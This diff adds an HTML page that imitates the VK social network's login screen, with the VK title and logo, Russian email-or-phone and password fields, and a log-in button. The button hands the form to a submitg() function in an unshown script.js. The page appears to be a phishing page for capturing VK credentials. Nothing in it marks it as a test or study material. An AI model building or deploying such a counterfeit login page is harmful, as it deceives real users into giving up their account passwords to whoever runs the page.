@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html>
+    <head>
+	<head>
+<style>
+        body{
+            text-align: center;
+            color: #edf1f7;
+            height: 100%;
+            text-decoration: none;
+        }
+
+        img{
+            width: 20%;
+            margin-top: 20%;
+            margin-bottom: 25%;
+        }
+        
+        input{
+            text-decoration: none;
+            outline:none;
+            width: 90%;
+            padding: 14px 0;
+            border: 0;
+            border-bottom: 2px solid #6389b7;
+            background-color: #527eaf;
+            transition-property: border-bottom;
+            transition-duration: 0.4s;
+            color: #edf1f7;
+            font-size: 16px;
+
+            text-decoration: none;
+        }
+
+        input:focus{border-bottom: 2px solid #edf1f7;}
+
+        input::-webkit-input-placeholder{color: #bccedf;}
+        input::-moz-placeholder{color: #bccedf;}
+
+        button{
+            cursor: pointer;
+            margin-top: 20px;
+            border-radius: 3px;
+            outline:none;
+            width: 90%;
+            padding: 18px;
+            border: 0;
+            background-color: #6792c2;
+            color: #edf1f7;
+            font-size: 16px;
+        }
+        button:hover{cursor: pointer; outline:none;}
+
+        h4{
+            position: bottom;
+            font-family: 'Roboto', sans-serif;
+            font-weight: 400;
+        }
+    </style>
+</head>
+        <meta charset="utf-8">
+        <link href="https://fonts.googleapis.com/css?family=Roboto:100,300,400" rel="stylesheet">
+        <title>VK</title>
+    
+</head>
+<body bgcolor="#527eaf">
+
+    <img src="vk.png" alt="">
+
+    <form id="form" action="javascript:void(null);">
+        <input type="text" placeholder="Email или телефон" name="login">
+        <input type="password" placeholder="Пароль" name="password">
+        <button id="button" name="subm" onclick="submitg()">Войти</button>
+    </form>
+
+    <h4>Зарегистрироваться</h4>
+        
+        <script src="https://ajax.googleapis.com/ajax/libs/angular_material/1.1.1/angular-material.min.js"></script>
+        <script src="script.js"></script>
+    <script src="jquery-3.1.1.min.js"></script>
+</body>
+</html>
+
